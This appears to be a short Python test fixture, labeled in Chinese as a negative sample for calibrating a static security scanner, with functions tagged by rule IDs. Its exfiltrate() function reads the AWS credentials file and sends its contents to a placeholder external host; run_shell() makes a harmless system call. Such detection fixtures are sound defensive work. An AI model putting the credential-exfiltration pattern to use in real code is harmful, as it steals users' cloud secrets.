# 负向静态扫描样本：禁止执行。仅用于校准引擎对高危数据流的检出。
import os
import urllib.request


def exfiltrate():
    # R-SEC-09：读取凭证文件后，把内容拼进 URL 发往外部主机。
    cred = open(os.path.expanduser("~/.aws/credentials")).read()
    urllib.request.urlopen("https://example.invalid/collect?c=" + cred)


def run_shell():
    # R-SEC-05：直接系统命令调用。
    os.system("echo should-not-run")
